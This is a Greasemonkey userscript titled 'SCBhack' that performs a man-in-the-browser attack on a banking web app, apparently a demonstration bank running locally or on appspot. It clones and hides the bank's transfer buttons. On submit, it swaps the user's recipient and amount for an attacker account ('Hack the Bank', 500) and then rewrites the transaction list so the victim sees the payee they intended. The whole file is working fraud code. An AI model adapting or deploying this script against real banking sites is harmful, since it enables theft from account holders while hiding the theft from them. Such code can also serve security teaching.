// ==UserScript==
// @name           SCBhack
// @namespace      de.mrx.client
// @description    Greasemonkey version of the hack.
// @include        http://127.0.0.1*
// @exclude        http://127.0.0.1*Admin*
// @include        http*securecloudbanking.appspot.com*
// @exclude        http*securecloudbanking.appspot.com*Admin*
// @require		   http://code.jquery.com/jquery-1.3.2.js
// ==/UserScript==


HACK_REC_ACCOUNT	="999666999";
HACK_REC_NAME		="Hack the Bank";
HACK_BANK_BLZ		="12060000";
HACK_BANK_NAME		="Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Hack Demo";
globalRC_Acc_Name="Rewe Koeln";
globalRC_Acc_Nr="725 826 262"
globalRC_Bank_BLZ="230 000 00";
globalRC_Bank_Name="Postbank"
global_Amount="34,50";
global_Usage="Vielen Dank fuer Ihren Einkauf";

ACC_NAME_INDEX = "ACC_NAME";
ACC_NR_INDEX = "ACC_NR";
BANK_BLZ_INDEX = "BANK_PLZ";
BANK_NAME_INDEX = "BANK_NAME";
AMOUNT_INDEX = "AMOUNT";
REMARK_INDEX = "REMARK";

//storage for real transfers
function Transfer(name, nr, blz, bankName, amount, remark) {
	this.acc_Name = name;
	this.acc_Nr = nr;
	this.bank_BLZ = blz;
	this.bank_Name = bankName;
	this.amount = amount;
	this.remark = remark;
}

Transfer.prototype.setAccName = function(name) {
	this.acc_Name = name;
}

Transfer.prototype.getAccName = function(){
	return this.acc_Name;
}

function saveTransfers(transfers) {
	
	for (i = 0; i < transfers.length; i++) {
		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);
		GM_setValue(ACC_NR_INDEX + i, transfers[i].nr);
		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].blz);
		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bankName);
		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
		GM_setValue(REMARK_INDEX + i, transfers[i].remark);

	}
	
}

function loadTransfers() {
	i = 0;
	transfers = new Array();
	while (true) {
		
		result = GM_getValue(ACC_NAME_INDEX + i, false);
		if (result == false)
			return;
		
		name = GM_getValue(ACC_NAME_INDEX + i);
		nr = GM_getValue(ACC_NR_INDEX + i);
		blz = GM_getValue(BANK_BLZ_INDEX + i);
		bankName = GM_getValue(BANK_NAME_INDEX + i);
		amount = GM_getValue(AMOUNT_INDEX + i);
		remark = GM_getValue(REMARK_INDEX + i);

		
		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark);
		i++;
	}
	return transfers;
}

realTransfers = loadTransfers();
alert(realTransfers.valuesOf());

	 function timedMsg()
		 {

		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 	


		 			$(this).attr("hackMarker","true");
		 			sendMoneyBtnClone=$(this).clone(true)
		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
		 			$(this).after(sendMoneyBtnClone);
		 			$(this).hide();
		 			$(this).attr("hackMarkerBtnOrig","true");		 			
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault(); 
		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
		 				 globalRC_Acc_Name=$("input:eq(2)").val();
		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
		 				 globalRC_Bank_Name=$("input:eq(4)").val();
		 				 global_Amount=$("input:eq(5)").val();
		 				 global_Usage=$("input:eq(6)").val();
		 				 
		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)").val(HACK_REC_NAME);
		 				$("input:eq(3)").val(HACK_BANK_BLZ);
		 				$("input:eq(4)").val(HACK_BANK_NAME);
		 				$("input:eq(5)").val(HACK_AMOUNT);
		 				$("input:eq(6)").val(HACK_USAGE);
		 				sendMoneyBtnClone.attr("activateReset","true");
		 				$("button[hackMarkerBtnOrig='true']")[0].click();

		 				$(this).hide();
		 				});			
		 			
		 	});
		 	
		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){		 		
		 		$("input:eq(1)").val(globalRC_Acc_Nr);
				$("input:eq(2)").val(globalRC_Acc_Name);
				$("input:eq(3)").val(globalRC_Bank_BLZ);
				$("input:eq(4)").val(globalRC_Bank_Name);
				$("input:eq(5)").val(global_Amount);
				$("input:eq(6)").val(global_Usage);
				 
		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){
		 		$(this).attr("hackMarker","true");
	 			sendMoneyConfirmBtnClone=$(this).clone(true)
	 			$(this).after(sendMoneyConfirmBtnClone);
	 			$(this).hide();
	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
	 			sendMoneyConfirmBtnClone.click(function(event) {
	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
	 				$("input:eq(2)").val(HACK_REC_NAME);
	 				$("input:eq(3)").val(HACK_BANK_BLZ);
	 				$("input:eq(4)").val(HACK_BANK_NAME);
	 				$("input:eq(5)").val(HACK_AMOUNT);
	 				$("input:eq(6)").val(HACK_USAGE);
	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
	 				$("input:eq(1)").val(globalRC_Acc_Nr);
					$("input:eq(2)").val(globalRC_Acc_Name);
					$("input:eq(3)").val(globalRC_Bank_BLZ);
					$("input:eq(4)").val(globalRC_Bank_Name);
					$("input:eq(5)").val(global_Amount);
					$("input:eq(6)").val(global_Usage);

	 				});
	 			
		 	});
		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		

 	
		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
		 	
		 	
		 	
		 	
		 	var t=setTimeout(timedMsg,300);
		 }
	 
	 $(document).ready(function() {
 	timedMsg();
	 });
  

 
 
  